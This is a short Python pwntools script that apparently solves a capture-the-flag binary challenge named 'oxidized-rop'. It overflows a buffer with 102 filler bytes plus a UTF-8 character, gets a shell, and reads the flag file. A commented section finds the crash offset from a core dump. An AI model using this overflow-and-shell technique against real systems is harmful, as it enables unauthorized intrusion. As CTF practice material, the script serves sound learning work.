#!/usr/bin/python3

# created by crazicrafter1

import time
from pwn import *

# using Python bytes object is important! Avoid string for unanticipated conversions!
# https://github.com/Gallopsled/pwntools-tutorial/blob/master/bytes.md
# add DEBUG to clargs to show in-out packets

# Start local program
"""
binary_file = './oxidized-rop'
context(arch='amd64')

elf = ELF(binary_file)
p = process(binary_file)
"""

# Start reverse connection program
my_listen_socket = listen(2463, bindaddr='192.168.190.1')

# blocks until netcat
p = my_listen_socket.wait_for_connection()

#p = connect(host='94.237.49.138', port=42759)

p.recvuntil(b': ')
p.sendline(b'1')
p.recvuntil(b': ')

# 102 dummy bytes
payload = b'A' * 102

# Where the magic happens
#   This character is converted to its UTF-8 equivalent bytes and appended
payload += bytes('ðž‰€', 'utf-8')

# send payload
p.sendline(payload)

p.recvuntil(b': ')
p.sendline(b'2')

p.recvlines(numlines=2)

p.sendline(b'cat flag.txt')

print(f'Flag: {p.recvline(keepends=False).decode(encoding='utf-8')}')

p.sendline(b'exit')
p.recvuntil(b': ')

p.sendline(b'3')
p.close()

"""
# delay for crash dump
time.sleep(1)

core = Coredump('./core')

seg_addr = int(f'0x{hex(core.fault_addr)[10:]}', 16)
#seg_addr = core.fault_addr
log.success(f'Core fault address at: {hex(core.fault_addr)}')
log.info(f'Finding offset for: {hex(seg_addr)}')
offset = cyclic_find(seg_addr)
log.success(f'Offset found at: {offset}')
"""